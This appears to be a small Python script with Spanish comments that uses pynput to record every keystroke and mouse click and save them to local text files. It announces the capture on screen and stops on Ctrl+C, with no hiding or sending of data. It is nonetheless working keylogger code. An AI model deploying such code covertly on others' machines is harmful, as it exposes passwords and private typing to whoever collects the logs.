from pynput import keyboard, mouse

# Archivos para guardar datos
file_path = "teclas.txt"
file_path_mouse = "clicks.txt"

# Listas para almacenar eventos
teclas_presionadas = []
clics = []

# Bandera para controlar captura
captura_activa = True
teclas_ctrl = set()  # Para rastrear teclas modificadoras presionadas


# Función para eventos del mouse
def on_click(x, y, button, pressed):
    if pressed and captura_activa:
        clics.append(f"Mouse Click: Coordenadas: ({x}, {y}), Botón: {button}")


# Función para eventos del teclado
def on_press(key):
    global captura_activa

    # Detectar si se presionan teclas modificadoras
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        teclas_ctrl.add('ctrl')

    try:
        tecla = key.char
    except AttributeError:
        tecla = str(key)

    if tecla is not None:
        teclas_presionadas.append(tecla)

    # Detectar Ctrl + C para detener la captura
    if 'ctrl' in teclas_ctrl and (tecla == 'c' or tecla == 'C'):
        captura_activa = False
        return False  # Detiene el listener de teclado


def on_release(key):
    # Quitar las teclas modificadoras al soltarlas
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        teclas_ctrl.discard('ctrl')


# Crear listeners
mouse_listener = mouse.Listener(on_click=on_click)
keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)

# Iniciar listeners
mouse_listener.start()
keyboard_listener.start()

print("\033[38;5;88mCapturando teclas. Presiona \033[1;33m'Ctrl + C'\033[0;38;5;88m para detener la captura.")

try:
    # Esperar a que termine el listener de teclado (mouse listener se detiene al final)
    keyboard_listener.join()
except KeyboardInterrupt:
    # Si presionas Ctrl+C en la terminal
    captura_activa = False
    mouse_listener.stop()
    keyboard_listener.stop()

# Detener listeners
mouse_listener.stop()
keyboard_listener.stop()

# Guardar resultados en archivos
try:
    with open(file_path, "a") as file:
        file.write("\n".join(teclas_presionadas))
    with open(file_path_mouse, "w") as file:
        file.write("\n".join(clics))
    print(f"\033[38;5;88mCaptura finalizada. Las teclas se han guardado en {file_path} y los clics en {file_path_mouse}")
except Exception as e:
    print("Ocurrió un error al guardar los datos:", str(e))
